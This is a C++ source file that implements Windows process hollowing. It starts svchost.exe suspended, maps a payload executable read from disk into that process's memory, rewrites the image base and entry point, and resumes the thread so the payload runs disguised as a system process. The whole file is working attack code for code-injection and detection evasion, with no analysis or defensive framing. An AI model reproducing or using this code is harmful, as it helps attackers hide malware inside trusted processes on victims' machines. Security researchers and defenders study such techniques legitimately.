
#include <windows.h>
#include <iostream>



void processhollowing() {

	HANDLE hFile = CreateFileA("D:\\payload.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	DWORD fileSize = GetFileSize(hFile, NULL);
	unsigned char* buffer = new unsigned char[fileSize];
	DWORD bytesRead;
	ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(buffer + dosHeader->e_lfanew);
	DWORD64 payloadImageBase = ntHeaders->OptionalHeader.ImageBase;
	DWORD payloadSizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
	DWORD payloadEntryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;

	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cout << "no dos signature, exitiong" << std::endl;
		return;
	}
	CloseHandle(hFile);

	std::cout << "payload buffer allocated, size is " << fileSize << " bytes" << std::endl;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);


	bool success = CreateProcessA(
		"C:\\Windows\\System32\\svchost.exe",
		NULL,
		NULL,
		NULL,
		false,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&si,
		&pi
	);
	if (!success) {
		std::cout << "failed to create process" << std::endl;
		return;
	}
	std::cout << "created notepad, pid: " << pi.dwProcessId << std::endl;
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(pi.hThread, &ctx)) {
		std::cout << "failed to get thread context" << std::endl;
		return;
	}
	std::cout << "got thread context.." << std::endl;
	// base is rdx + 0x10
	unsigned __int64 imagebase = 0;

	if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 0x10), &imagebase, 8, NULL)) {
		std::cout << "failed to readprocessmemory to get image base" << std::endl;
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return;
	}
	std::cout << "got image base!!! "   << "0x"  << std::hex << imagebase << std::endl;


	LPVOID remotebase= VirtualAllocEx(
		pi.hProcess,
		(LPVOID)payloadImageBase,
		payloadSizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (remotebase == NULL) {
		remotebase = VirtualAllocEx(pi.hProcess, NULL, payloadSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}

	if (!WriteProcessMemory(pi.hProcess, remotebase, buffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
		std::cout << "couldnt write to process memory" << std::endl;
		delete[] buffer;
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return;

	}
	std::cout << "wrote to process memory" << std::endl;
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
		WriteProcessMemory(
			pi.hProcess,
			(LPVOID)((LPBYTE)remotebase + sectionHeader[i].VirtualAddress),
			(LPVOID)((LPBYTE)buffer + sectionHeader[i].PointerToRawData),
			sectionHeader[i].SizeOfRawData,
			NULL
		);
	}
	std::cout << "done writing memory." << std::endl;

	WriteProcessMemory(
		pi.hProcess,
		(LPVOID)(ctx.Rdx + 0x10),
		&remotebase,
		sizeof(LPVOID),
		NULL
	);

	ctx.Rcx = (DWORD64)((LPBYTE)remotebase + payloadEntryPoint);
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);

	std::cout << "done proccess hollowing and also replacing the iamge base and wrinting payload" << std::endl;
	// end
	delete[] buffer;
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

}
int main()
{
	std::cout << "process hollowing" << std::endl;
	processhollowing();
}
